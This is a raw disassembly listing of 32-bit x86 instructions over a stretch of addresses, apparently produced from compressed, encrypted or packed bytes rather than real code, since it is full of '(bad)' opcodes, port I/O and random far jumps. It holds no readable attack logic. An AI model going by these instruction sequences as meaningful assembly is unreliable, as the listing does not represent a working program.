  416c82:	sbb    cl,BYTE PTR [esi+0xb5a26dc]
  416c88:	in     al,dx
  416c89:	xchg   DWORD PTR [eax+0x262b953a],edx
  416c8f:	mov    bl,0xa7
  416c91:	aaa    
  416c92:	xchg   esp,eax
  416c93:	pop    ebp
  416c94:	xchg   esi,eax
  416c95:	scas   eax,DWORD PTR es:[edi]
  416c96:	or     eax,0xed885d1e
  416c9b:	test   eax,0x3a476cf5
  416ca0:	adc    eax,0x4ce24bb2
  416ca5:	xchg   ebx,eax
  416ca6:	test   eax,0x6ad726e
  416cab:	retf   0xf248
  416cae:	inc    ecx
  416caf:	xchg   esi,eax
  416cb0:	jne    0x416c59
  416cb2:	popa   
  416cb3:	mov    ebx,DWORD PTR [ebx]
  416cb5:	mov    ds:0x6a8b0bfb,eax
  416cba:	jge    0x416c63
  416cbc:	stos   BYTE PTR es:[edi],al
  416cbd:	xor    al,0x6b
  416cbf:	dec    edx
  416cc0:	(bad)  
  416cc1:	add    BYTE PTR [edx-0x80],0x98
  416cc5:	sbb    eax,0xed796a9c
  416cca:	sar    ch,0x92
  416ccd:	(bad)  
  416cce:	lahf   
  416ccf:	jge    0x416cec
  416cd1:	fs adc ebx,ebx
  416cd4:	and    edi,ebx
  416cd6:	cmp    DWORD PTR [ecx-0x5956b35b],esi
  416cdc:	add    ecx,DWORD PTR [eax+0x6e]
  416cdf:	cld    
  416ce0:	sub    eax,0x641cd996
  416ce5:	bnd jb 0x416cb1
  416ce8:	mov    esi,DWORD PTR [ecx]
  416cea:	aaa    
  416ceb:	arpl   WORD PTR ds:0xcf036d80,bp
  416cf1:	repz data16 jns 0x416d1a
  416cf5:	xchg   esi,eax
  416cf6:	adc    edi,esp
  416cf8:	add    bh,BYTE PTR [edx+0x47d3fb4b]
  416cfe:	fsub   DWORD PTR [esi]
  416d00:	xchg   ecx,eax
  416d01:	xor    al,0xc4
  416d03:	xor    DWORD PTR [ebx+esi*8+0x30a2fe0d],edx
  416d0a:	xchg   ebp,eax
  416d0b:	xchg   esi,eax
  416d0c:	bound  esi,QWORD PTR [edx-0x3a]
  416d0f:	repz sbb al,0x0
	...
  416d72:	add    BYTE PTR [eax],al
  416d74:	and    DWORD PTR [ebx-0x40445077],edx
  416d7a:	daa    
  416d7b:	lahf   
  416d7c:	mov    ch,0x99
  416d7e:	pop    edx
  416d7f:	das    
  416d80:	add    al,0x47
  416d82:	scas   al,BYTE PTR es:[edi]
  416d83:	nop
  416d84:	ja     0x416d77
  416d86:	add    BYTE PTR [eax],al
  416d88:	add    eax,0xf1000001
  416d8d:	sub    esi,DWORD PTR [esi]
  416d8f:	dec    ebx
  416d90:	mov    edx,0x65472b62
  416d95:	cld    
  416d96:	sbb    ebx,DWORD PTR [ebp-0x7c]
  416d99:	dec    ecx
  416d9a:	cwde   
  416d9b:	inc    esp
  416d9c:	outs   dx,DWORD PTR ds:[esi]
  416d9d:	xlat   BYTE PTR ds:[ebx]
  416d9e:	nop
  416d9f:	inc    edi
  416da0:	xchg   ebx,eax
  416da1:	adc    al,0x6d
  416da3:	sub    eax,0xe9233f58
  416da8:	add    esp,ebp
  416daa:	mov    eax,0x9692a076
  416daf:	scas   al,BYTE PTR es:[edi]
  416db0:	or     ch,al
  416db2:	in     al,0x79
  416db4:	xchg   ebp,eax
  416db5:	nop
  416db6:	es or  ch,BYTE PTR ss:[esi-0x9]
  416dbb:	push   esi
  416dbc:	icebp  
  416dbd:	gs sti 
  416dbf:	lahf   
  416dc0:	enter  0x532f,0xa4
  416dc4:	clc    
  416dc5:	(bad)  
  416dc6:	push   ebp
  416dc7:	pop    esi
  416dc8:	mov    esp,eax
  416dca:	cmp    esp,edx
  416dcc:	test   DWORD PTR ds:0x6a1b7b9f,edi
  416dd2:	imul   esi,edx,0x8227fe06
  416dd8:	adc    DWORD PTR [ebx+0x213f6412],edx
  416dde:	add    ebp,esp
  416de0:	rcr    edx,cl
  416de2:	adc    DWORD PTR gs:[edi+0x4b],ebx
  416de6:	mov    WORD PTR [edi+ecx*1-0x4e],es
  416dea:	out    0x1d,al
  416dec:	xor    ah,BYTE PTR [ecx]
  416dee:	or     esi,DWORD PTR ds:0x4e22104
  416df4:	jp     0x416e15
  416df6:	out    dx,al
  416df7:	jmp    0x8be1cab1
  416dfc:	stc    
  416dfd:	jp     0x416dda
  416dff:	dec    esp
  416e00:	loope  0x416e80
  416e02:	out    0xed,al
  416e04:	cmp    BYTE PTR [edi+eax*8+0x41],al
  416e08:	cld    
  416e09:	xchg   esi,eax
  416e0a:	inc    eax
  416e0b:	mov    bh,0x2f
  416e0d:	daa    
  416e0e:	out    0xee,eax
  416e10:	aam    0x69
  416e12:	and    eax,DWORD PTR [ebx+0x36]
  416e15:	and    cl,BYTE PTR [edi+0x65]
  416e18:	dec    ecx
  416e19:	xor    al,0xaf
  416e1b:	add    eax,0x1e8903dd
  416e20:	leave  
  416e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e22:	jne    0x416ea2
  416e24:	sar    bl,cl
  416e26:	in     al,dx
  416e27:	js     0x416dce
  416e29:	fistp  DWORD PTR [edx-0x52963b57]
  416e2f:	jnp    0x416e16
  416e31:	std    
  416e32:	lods   eax,DWORD PTR ds:[esi]
  416e33:	(bad)  
  416e34:	mov    edx,0xfd5ee47c
  416e39:	iret   
  416e3a:	jo     0x416dc1
  416e3c:	pop    ss
  416e3d:	pop    ebx
  416e3e:	inc    ebx
  416e3f:	or     eax,0xd18e2c0c
  416e44:	push   edx
  416e45:	cmp    dl,BYTE PTR [esi+0x6b83d77c]
  416e4b:	das    
  416e4c:	data16 mov ?,WORD PTR ds:0xfeaa836b
  416e53:	ins    DWORD PTR es:[edi],dx
  416e54:	mov    ds:0xe3b5320a,al
  416e59:	shl    BYTE PTR [ecx],0xd1
  416e5c:	adc    eax,0x4125d6b7
  416e61:	loopne 0x416e0d
  416e63:	call   0x667b60c9
  416e68:	or     al,0x9c
  416e6a:	or     ah,dl
  416e6c:	cwde   
  416e6d:	sbb    DWORD PTR [edx+0x51],edx
  416e70:	fnsave [esi-0x2c378780]
  416e76:	sub    DWORD PTR [edx+0x6bfb1517],ebp
  416e7c:	pop    ebx
  416e7d:	lahf   
  416e7e:	aad    0x21
  416e80:	imul   eax,DWORD PTR [esi+0x5dc5b645],0xffffff8a
  416e87:	out    dx,eax
  416e88:	pop    esi
  416e89:	and    edx,DWORD PTR [edi+0x71]
  416e8c:	adc    eax,0xa4ab256a
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x65138eea
  416f02:	(bad)  
  416f03:	adc    edi,DWORD PTR [edx+esi*8+0x0]
  416f07:	add    BYTE PTR ds:0x4f000001,al
  416f0d:	jo     0x416f5b
  416f0f:	jo     0x416f6a
  416f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f12:	mov    ah,0x66
  416f14:	test   eax,0x398053d8
  416f19:	lea    edi,[edx]
  416f1b:	sub    BYTE PTR [ebp+0x63],dl
  416f1e:	xor    al,0xd1
  416f20:	out    dx,eax
  416f21:	sbb    BYTE PTR [edx*2-0x35786f6f],bh
  416f28:	jb     0x416f21
  416f2a:	scas   al,BYTE PTR es:[edi]
  416f2b:	test   DWORD PTR [eax+0xb],0x573dbf7a
  416f32:	bound  ebp,QWORD PTR [eax+0x78e06856]
  416f38:	les    edx,FWORD PTR ds:0x534f81c4
  416f3e:	(bad)  
  416f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f40:	addr16 jne 0x416f10
  416f43:	rol    DWORD PTR [edi],0x44
  416f46:	outs   dx,DWORD PTR ds:[esi]
  416f47:	push   eax
  416f48:	and    edi,eax
  416f4a:	enter  0x205b,0x35
  416f4e:	cwde   
  416f4f:	pop    esp
  416f50:	sbb    BYTE PTR [edx+0x52],dl
  416f53:	lahf   
  416f54:	into   
  416f55:	nop
  416f56:	test   BYTE PTR [ecx-0x1da8625b],ch
  416f5c:	lock jbe 0x416fbf
  416f5f:	cwde   
  416f60:	inc    edx
  416f61:	ret    
  416f62:	nop
  416f63:	sub    ebp,0x2da14b49
  416f69:	aaa    
  416f6a:	inc    ebp
  416f6b:	sti    
  416f6c:	push   ebp
  416f6d:	adc    ebp,DWORD PTR [ebp-0x27]
  416f70:	cmp    DWORD PTR [ebx+eax*4-0x22e8b7bf],eax
  416f77:	imul   eax,ebp,0xffffffa1
  416f7a:	mov    ah,0xae
  416f7c:	pop    esp
  416f7d:	push   0x10fd2bb6
  416f82:	nop
  416f83:	cmp    DWORD PTR [ecx+0x29ab7abf],0x4a432b36
  416f8d:	addr16 mov bl,0xf5
  416f90:	add    ecx,DWORD PTR [edi+0x13]
  416f93:	sbb    BYTE PTR ds:0xe1c60dd7,ch
  416f99:	mov    ecx,DWORD PTR [esi+eax*1]
  416f9c:	jb     0x416f8d
  416f9e:	pop    es
  416f9f:	mov    bh,0x5c
  416fa1:	xchg   esp,eax
  416fa2:	cmp    DWORD PTR [edi+0x17fda1f0],edx
  416fa8:	in     al,0xae
  416faa:	add    al,0x1
  416fac:	jo     0x416f36
  416fae:	xor    ch,BYTE PTR [ebp-0x63]
  416fb1:	lock fbstp TBYTE PTR [ebx+ebx*2+0x5485c53c]
  416fb9:	jg     0x417021
  416fbb:	shr    BYTE PTR [edx],cl
  416fbd:	xor    edi,DWORD PTR [edi+0x3b]
  416fc0:	addr16 xchg ebp,eax
  416fc2:	cs xor al,0xfa
  416fc5:	sbb    DWORD PTR [si+0x78c4],edi
  416fca:	pushf  
  416fcb:	dec    eax
  416fcc:	adc    DWORD PTR [eax],edx
  416fce:	pusha  
  416fcf:	cmp    esp,ebx
  416fd1:	imul   ebp,DWORD PTR [ebp+0x19e5345b],0x33
  416fd8:	inc    ecx
  416fd9:	lahf   
  416fda:	test   DWORD PTR [esi+0x119d65df],ebp
  416fe0:	into   
  416fe1:	and    eax,0x72d04487
  416fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fe7:	stos   DWORD PTR es:[edi],eax
  416fe8:	sbb    bh,BYTE PTR [edi+0x10]
  416feb:	inc    edx
  416fec:	jo     0x416fb2
  416fee:	(bad)
  416ff1:	or     esi,DWORD PTR [edi-0x3ca48849]
  416ff7:	sub    ah,ah
  416ff9:	jl     0x416ff4
  416ffb:	mov    ebx,0x70cdf758
  417000:	xchg   ebx,eax
  417001:	mov    ?,WORD PTR [ebx]
  417003:	cmp    edx,DWORD PTR ds:0x419823d6
  417009:	hlt    
  41700a:	(bad)  
  41700c:	out    0xc5,eax
  41700e:	into   
  41700f:	nop
  417010:	push   cs
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [ebx-0x7ead97b8]
  417085:	repz add BYTE PTR [eax],al
  417088:	add    eax,0xcb000001
  41708d:	or     ebp,DWORD PTR [esi-0x3c]
  417090:	add    al,0xc0
  417092:	outs   dx,DWORD PTR ds:[esi]
  417093:	mov    eax,ds:0x8642c427
  417098:	popa   
  417099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41709a:	fisttp QWORD PTR [ecx]
  41709c:	push   ebp
  41709d:	mov    ah,0xb1
  41709f:	test   al,0xf5
  4170a1:	hlt    
  4170a2:	and    bh,ch
  4170a4:	rcl    BYTE PTR [eax+edx*8+0xc],0x75
  4170a9:	jmp    0x1de9487e
  4170ae:	fs adc eax,0x2a7fd57f
  4170b4:	inc    ebp
  4170b5:	jge    0x417113
  4170b7:	(bad)  
  4170b8:	mov    eax,0x46562cf2
  4170bd:	cli    
  4170be:	xchg   ebx,eax
  4170bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170c0:	(bad)
  4170c3:	sbb    ebp,DWORD PTR [ebp-0x4e]
  4170c6:	call   0x8285:0x3f6bfcf6
  4170cd:	fidiv  WORD PTR [edx]
  4170cf:	ds cmp al,0xe9
  4170d2:	xchg   edx,eax
  4170d3:	ins    DWORD PTR es:[edi],dx
  4170d4:	imul   esi
  4170d6:	popa   
  4170d7:	mov    ds:0xc93392d7,eax
  4170dc:	mov    ebx,0x94cf4a1
  4170e1:	inc    eax
  4170e2:	pop    ebx
  4170e3:	sub    eax,0x54be3789
  4170e8:	mov    dl,0x36
  4170ea:	pop    ds
  4170eb:	test   al,0xe4
  4170ed:	int3   
  4170ee:	in     eax,dx
  4170ef:	fidiv  DWORD PTR [eax-0x65]
  4170f2:	mov    ch,ch
  4170f4:	(bad)  
  4170f5:	imul   esi,DWORD PTR [ebp-0x155a6fda],0x39
  4170fc:	xor    dl,al
  4170fe:	pop    ds
  4170ff:	into   
  417100:	xchg   esi,eax
  417101:	push   esi
  417102:	add    BYTE PTR [eax+esi*1-0xe3f8c19],bh
  417109:	dec    esp
  41710a:	loopne 0x4170b7
  41710c:	in     al,dx
  41710d:	sbb    eax,0x43a04b2c
  417112:	push   eax
  417113:	add    BYTE PTR [edi+0x3046b5c1],dl
  417119:	mov    ebx,DWORD PTR [ecx-0x2d48897f]
  41711f:	mov    esi,0x8f7a9545
  417124:	jmp    0x417127
  417126:	inc    edx
  417127:	lods   eax,DWORD PTR ds:[esi]
  417128:	or     bh,bl
  41712a:	xlat   BYTE PTR ds:[ebx]
  41712b:	pop    ebp
  41712c:	out    dx,eax
  41712d:	mov    eax,esi
  41712f:	mov    ebp,0x896a8590
  417134:	jne    0x4171a4
  417136:	test   DWORD PTR [ecx-0x2e],ebp
  417139:	not    BYTE PTR [esi]
  41713b:	push   ebx
  41713c:	leave  
  41713d:	popa   
  41713e:	pusha  
  41713f:	mov    eax,0xcd53bd0d
  417144:	pop    ds
  417145:	aas    
  417146:	and    BYTE PTR [ebp-0x45],cl
  417149:	dec    edx
  41714a:	or     esi,ebp
  41714c:	lahf   
  41714d:	xor    al,0x44
  41714f:	push   es
  417150:	push   ebx
  417151:	mov    ?,edi
  417153:	in     eax,dx
  417154:	jp     0x417114
  417156:	sbb    ebp,edx
  417158:	call   0x6a8c:0x7c8756c2
  41715f:	or     eax,DWORD PTR [ecx]
  417161:	or     eax,0xb308fda5
  417166:	add    eax,0xc535ae9b
  41716b:	push   0xa9fd7e8f
  417170:	mov    DWORD PTR [ecx+0x42],eax
  417173:	iret   
  417174:	stc    
  417175:	mov    ecx,0x6961ca2f
  41717a:	imul   edx,DWORD PTR [eax+0x20],0xffffffc7
  41717e:	push   esi
  41717f:	(bad)  
  417180:	fnsave [esp+ebx*2+0x1f94750f]
  417187:	dec    ecx
  417188:	lock dec ecx
  41718a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41718b:	scas   al,BYTE PTR es:[edi]
  41718c:	sub    al,0x20
  41718e:	cmc    
  41718f:	int    0x61
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	mov    ecx,0x86e7e927
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0x20000001
  41720d:	mov    edx,0xb62359a9
  417212:	aaa    
  417213:	jbe    0x417287
  417215:	aas    
  417216:	daa    
  417217:	add    edi,DWORD PTR [edi+0x7a]
  41721a:	and    al,0x36
  41721c:	jno    0x417269
  41721e:	push   esi
  41721f:	arpl   WORD PTR [edx],ax
  417221:	mov    esi,0xed235d47
  417226:	in     eax,0x75
  417228:	sbb    eax,0x49c81f4
  41722d:	test   eax,0x1f79847b
  417232:	jl     0x417291
  417234:	push   cs
  417235:	cli    
  417236:	pop    esp
  417237:	xor    edx,edi
  417239:	in     eax,dx
  41723a:	cdq    
  41723b:	or     DWORD PTR [edx],esi
  41723d:	mov    ah,0x55
  41723f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417240:	fidivr DWORD PTR [ebx-0x706ddc11]
  417246:	xor    ecx,DWORD PTR [edi]
  417248:	xchg   edx,eax
  417249:	pop    ebp
  41724a:	pop    esi
  41724b:	inc    ecx
  41724c:	repnz int 0x5d
  41724f:	(bad)  
  417250:	jp     0x41722f
  417252:	push   0x3917a6f8
  417257:	test   DWORD PTR [ebp+ecx*1-0x13],edi
  41725b:	mov    ebp,0x742cd16d
  417260:	cmp    BYTE PTR [ebp-0x6700e328],ch
  417266:	pop    es
  417267:	xor    BYTE PTR ds:0xbdd7ad67,dl
  41726d:	test   eax,0xfb629407
  417272:	inc    edx
  417273:	mov    DWORD PTR [ebx-0x21de8da7],edx
  417279:	inc    edi
  41727a:	pop    esp
  41727b:	add    eax,0xf834d98d
  417280:	scas   al,BYTE PTR es:[edi]
  417281:	imul   edx,DWORD PTR [eax+0x6c6b0296],0xffffffd3
  417288:	ja     0x4172ea
  41728a:	push   edx
  41728b:	mov    ds:0xe6cba93,al
  417290:	add    bh,BYTE PTR [edi-0x4001561e]
  417296:	sar    DWORD PTR [ecx-0x7889b88b],1
  41729c:	push   esi
  41729d:	jns    0x4172e0
  41729f:	add    DWORD PTR [eax+0x8],esp
  4172a2:	sub    al,0x67
  4172a4:	retf   
  4172a5:	daa    
  4172a6:	dec    edx
  4172a7:	mov    al,0x33
  4172a9:	push   0x20
  4172ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ac:	sub    edx,edx
  4172ae:	mov    eax,ds:0x29f3ab97
  4172b3:	xchg   esi,eax
  4172b4:	mov    ebp,0x9eed9814
  4172b9:	jmp    0x295b:0x8a6efded
  4172c0:	cmp    edx,DWORD PTR ds:0x16a9f9bb
  4172c6:	jge    0x417257
  4172c8:	or     bh,BYTE PTR [ebx+0x2f5404f9]
  4172ce:	mov    ecx,0x22527c47
  4172d3:	jle    0x4172e5
  4172d5:	scas   al,BYTE PTR es:[edi]
  4172d6:	leave  
  4172d7:	stos   DWORD PTR es:[edi],eax
  4172d8:	les    edx,FWORD PTR [ebx-0x1f]
  4172db:	mov    ebp,0xa6527ef8
  4172e0:	add    DWORD PTR [edx],edx
  4172e2:	and    eax,DWORD PTR [edx]
  4172e4:	mov    ah,0x67
  4172e6:	call   0x4f85:0x3441372a
  4172ed:	dec    ebp
  4172ee:	les    ecx,FWORD PTR [edi-0x26]
  4172f1:	mov    edx,0x122ff83
  4172f6:	jge    0x4172b0
  4172f8:	js     0x417361
  4172fa:	test   ch,dl
  4172fc:	mov    ds:0x8ec6ac7e,al
  417301:	scas   al,BYTE PTR es:[edi]
  417302:	dec    ecx
  417303:	mov    eax,0xb0391361
  417308:	adc    BYTE PTR [edx],cl
  41730a:	jno    0x417324
  41730c:	(bad)  
  41730d:	jo     0x41738e
  41730f:	call   0x4173bb
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs cmp edi,edx
  417382:	repz gs mov esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0xee000001
  41738d:	ss in  al,0xd
  417390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417391:	sub    al,0xcc
  417393:	in     al,0xe6
  417395:	dec    eax
  417396:	mov    dh,0x6a
  417398:	cmp    al,BYTE PTR [eax+ebp*2]
  41739b:	sub    al,0x65
  41739d:	adc    dl,ch
  41739f:	xor    ebx,DWORD PTR [ecx]
  4173a1:	fwait
  4173a2:	inc    edx
  4173a3:	dec    ecx
  4173a4:	push   0x8bdcc5e9
  4173a9:	jge    0x4173b6
  4173ab:	(bad)  
  4173ac:	repz (bad) 
  4173af:	push   ds
  4173b0:	and    esp,DWORD PTR [ebp+0x77]
  4173b3:	int    0xe3
  4173b5:	inc    edi
  4173b6:	aam    0xd3
  4173b8:	adc    eax,0xf4b7a234
  4173bd:	iret   
  4173be:	xchg   edx,eax
  4173bf:	xchg   ebx,eax
  4173c0:	bound  ecx,QWORD PTR [edi]
  4173c2:	xchg   esp,eax
  4173c3:	(bad)  
  4173c7:	lock mov eax,0xeda40323
  4173cd:	ins    BYTE PTR es:[edi],dx
  4173ce:	(bad)  
  4173cf:	in     al,0x56
  4173d1:	enter  0xd93c,0xe3
  4173d5:	stos   DWORD PTR es:[edi],eax
  4173d6:	mov    edx,0x10a9284e
  4173db:	scas   al,BYTE PTR es:[edi]
  4173dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173dd:	lods   al,BYTE PTR ds:[esi]
  4173de:	int3   
  4173df:	loop   0x417394
  4173e1:	std    
  4173e2:	sub    esp,0xac9a4061
  4173e8:	add    DWORD PTR [esi*2-0x1878fe2a],esi
  4173ef:	ss in  eax,dx
  4173f1:	test   dl,ch
  4173f3:	fisub  WORD PTR [edx]
  4173f5:	test   eax,0x68ed7862
  4173fa:	pmullw mm3,QWORD PTR ds:0x75e218ec
  417401:	(bad)  
  417402:	in     eax,0x8f
  417404:	lock lods eax,DWORD PTR ds:[esi]
  417406:	popf   
  417407:	adc    eax,DWORD PTR [eax+0x7e404544]
  41740d:	inc    edx
  41740e:	mov    ebx,0xe1efc53c
  417413:	xor    al,0x74
  417415:	mov    ds:0x95eaf0ab,eax
  41741a:	push   es
  41741b:	mov    cl,0x20
  41741d:	push   ds
  41741e:	sub    DWORD PTR [edx+0x985c3f8],ecx
  417424:	iret   
  417425:	mov    ds:0xc6f2b4a9,al
  41742a:	and    DWORD PTR [eax+0x27],ecx
  41742d:	mov    dh,0x7
  41742f:	mov    eax,ds:0xf8f9e5b5
  417434:	inc    edx
  417435:	push   ds
  417436:	in     al,0xf1
  417438:	jae    0x4173c4
  41743a:	icebp  
  41743b:	cmp    DWORD PTR [ecx+0x68cc87f7],ebp
  417441:	cs dec eax
  417443:	mov    ecx,db4
  417446:	ror    BYTE PTR ds:0x8a1d6a54,cl
  41744c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41744d:	loopne 0x4174b1
  41744f:	cmp    edi,DWORD PTR [ebp-0x64]
  417452:	retf   0x81f7
  417455:	in     al,0x81
  417457:	mov    dh,0xa4
  417459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41745a:	gs push ecx
  41745c:	xchg   ecx,eax
  41745d:	jl     0x41746e
  41745f:	xchg   ebp,eax
  417460:	rcl    BYTE PTR fs:[ebp+edi*4+0x78],1
  417465:	clc    
  417466:	ficom  DWORD PTR [ecx+0xd11b597]
  41746c:	nop
  41746d:	ret    0x4e50
  417470:	xor    ebx,DWORD PTR [eax]
  417472:	in     eax,0xf5
  417474:	push   eax
  417475:	cli    
  417476:	arpl   WORD PTR [ebx],sp
  417478:	jbe    0x417496
  41747a:	les    edx,FWORD PTR [edx+0x7a510c8]
  417480:	push   es
  417481:	stos   DWORD PTR es:[edi],eax
  417482:	jbe    0x417434
  417484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417485:	ficom  DWORD PTR [esi+0x49]
  417488:	pop    ebx
  417489:	or     bh,dl
  41748b:	xchg   dl,bh
  41748d:	xchg   esi,eax
  41748e:	sti    
  41748f:	out    dx,al
  417490:	xchg   edi,eax
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	fs push edi
  417502:	popa   
  417503:	rcl    BYTE PTR [eax+0x50000f6],cl
  417509:	add    DWORD PTR [eax],eax
  41750b:	add    bh,cl
  41750d:	fmul   DWORD PTR [esi]
  41750f:	in     eax,dx
  417510:	jbe    0x417554
  417512:	xchg   BYTE PTR [ecx],dh
  417514:	push   es
  417515:	and    eax,0x8fb5a72b
  41751a:	cmp    eax,0xdb8bb876
  41751f:	outs   dx,DWORD PTR ds:[esi]
  417520:	int    0xe9
  417522:	push   ds
  417523:	dec    edi
  417524:	jae    0x41759a
  417526:	or     dh,BYTE PTR [ebx-0x38af9b9f]
  41752c:	add    ebp,ecx
  41752e:	or     eax,0xca49fa9
  417533:	addr16 dec esp
  417535:	pop    ds
  417536:	fild   DWORD PTR [edi+ecx*4-0x1f]
  41753a:	repz sbb edi,edi
  41753d:	loopne 0x417544
  41753f:	or     al,0x9f
  417541:	scas   al,BYTE PTR es:[edi]
  417542:	add    DWORD PTR [edx-0x4e2940ea],esi
  417548:	inc    esi
  417549:	adc    al,0x43
  41754b:	ret    
  41754c:	popa   
  41754d:	jne    0x41751e
  41754f:	jle    0x4174df
  417551:	inc    ebx
  417552:	xchg   esi,eax
  417553:	and    al,0x60
  417555:	mov    ecx,DWORD PTR [edi]
  417557:	cs jg  0x4175d5
  41755a:	cwde   
  41755b:	jmp    0xefba:0xc22f7c2f
  417562:	pop    ss
  417563:	jmp    0x417552
  417565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417566:	gs pop ebx
  417568:	cdq    
  417569:	xchg   ebx,eax
  41756a:	xchg   edi,eax
  41756b:	cmp    BYTE PTR [ecx-0x6b7eb16e],ah
  417571:	or     eax,0x903c5978
  417576:	shl    eax,1
  417578:	sbb    ch,BYTE PTR [ebx+edx*1+0x6e]
  41757c:	cmp    eax,0xb0ef0e55
  417581:	cmp    al,0xa5
  417583:	rol    BYTE PTR [eax+0x3d],1
  417586:	xchg   BYTE PTR [esi+edx*4+0x2b93a6fc],dl
  41758d:	jno    0x4175d7
  41758f:	xor    DWORD PTR [ecx+0x31ffb350],ebp
  417595:	pop    DWORD PTR [ebx+0x26b24e59]
  41759b:	cmp    dl,BYTE PTR [edx]
  41759d:	add    ecx,esp
  41759f:	pop    ebx
  4175a0:	push   0x68b95ba5
  4175a5:	lods   eax,DWORD PTR ds:[esi]
  4175a6:	cs mov ebx,0xa4b7439f
  4175ac:	pop    ds
  4175ad:	xchg   esp,eax
  4175ae:	and    eax,0x8d86af89
  4175b3:	in     al,0xde
  4175b5:	into   
  4175b6:	lds    ebp,FWORD PTR [ebx-0x3b1afedb]
  4175bc:	and    ecx,ebp
  4175be:	mov    cl,0x65
  4175c0:	and    BYTE PTR [edx-0x1f],dl
  4175c3:	ror    BYTE PTR [ebp-0x30],0x1
  4175c7:	test   eax,0x8e81579d
  4175cc:	inc    esi
  4175cd:	lea    eax,[esi-0x63]
  4175d0:	jno    0x417573
  4175d2:	mov    al,0x85
  4175d4:	add    DWORD PTR [edx+0x59],edx
  4175d7:	xchg   ebp,eax
  4175d8:	aad    0x88
  4175da:	push   ecx
  4175db:	add    DWORD PTR [eax+0x65d3a4d1],ecx
  4175e1:	add    BYTE PTR [eax-0xe6be63e],cl
  4175e7:	mov    es,WORD PTR [ebx-0x67a34a62]
  4175ed:	and    eax,0x39
  4175f0:	sub    dl,cl
  4175f2:	sbb    bh,BYTE PTR [ebx+0x30e50056]
  4175f8:	enter  0x9c67,0xbc
  4175fc:	fdivp  st(4),st
  4175fe:	leave  
  4175ff:	jecxz  0x41767c
  417601:	jmp    0x33d68183
  417606:	out    dx,al
  417607:	out    0xf2,al
  417609:	popa   
  41760a:	cmp    dh,BYTE PTR [edx-0x1f]
  41760d:	or     ecx,DWORD PTR [ebp-0x4]
  417610:	std    
	...
  417671:	add    BYTE PTR [eax],al
  417673:	add    BYTE PTR [ecx-0x20b02c99],ch
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fcmove st,st(5)
  417681:	les    eax,FWORD PTR [ebx+edi*8-0x6b]
  417685:	test   DWORD PTR [eax],0x10500
  41768b:	add    BYTE PTR [ebx],ch
  41768d:	xchg   edi,eax
  41768e:	in     al,0x1e
  417690:	out    0x7,eax
  417692:	mov    cl,0x48
  417694:	jae    0x4176cd
  417696:	jo     0x41762f
  417698:	ins    BYTE PTR es:[edi],dx
  417699:	ins    BYTE PTR es:[edi],dx
  41769a:	inc    BYTE PTR [edi]
  41769c:	pushf  
  41769d:	mov    eax,0x76a3a222
  4176a2:	ins    BYTE PTR es:[edi],dx
  4176a3:	stc    
  4176a4:	daa    
  4176a5:	imul   DWORD PTR [eax+0x4f]
  4176a8:	sbb    BYTE PTR [eax],al
  4176aa:	cmp    eax,DWORD PTR [ebp-0x12f7d7f3]
  4176b0:	adc    ebx,DWORD PTR gs:[edx-0x3b9dda78]
  4176b7:	xor    esp,DWORD PTR [ecx+0x4c]
  4176ba:	cmp    eax,DWORD PTR [edx]
  4176bc:	sar    BYTE PTR [edi+edi*1+0x44c0b509],0xa1
  4176c4:	std    
  4176c5:	sbb    ecx,DWORD PTR [esi-0xb401d79]
  4176cb:	jb     0x417743
  4176cd:	jno    0x4176e0
  4176cf:	in     eax,dx
  4176d0:	or     bl,ch
  4176d2:	sbb    DWORD PTR [ebx+0x6f98b173],eax
  4176d8:	push   ecx
  4176d9:	in     al,0xc1
  4176db:	inc    ebp
  4176dc:	lods   eax,DWORD PTR ds:[esi]
  4176dd:	cs inc esp
  4176df:	ror    DWORD PTR [ebp-0x66b7e964],cl
  4176e5:	hlt    
  4176e6:	lods   eax,DWORD PTR ds:[esi]
  4176e7:	in     al,dx
  4176e8:	or     esp,DWORD PTR [edx]
  4176ea:	in     eax,0x59
  4176ec:	sti    
  4176ed:	push   eax
  4176ee:	fdiv   QWORD PTR [ebp-0x1a2622ab]
  4176f4:	cmp    ch,bh
  4176f6:	jno    0x41774a
  4176f8:	adc    eax,0x14042fa
  4176fd:	iret   
  4176fe:	stos   BYTE PTR es:[edi],al
  4176ff:	mov    eax,ds:0x43b06a3f
  417704:	ret    0xb4a
  417707:	sti    
  417708:	sub    al,bh
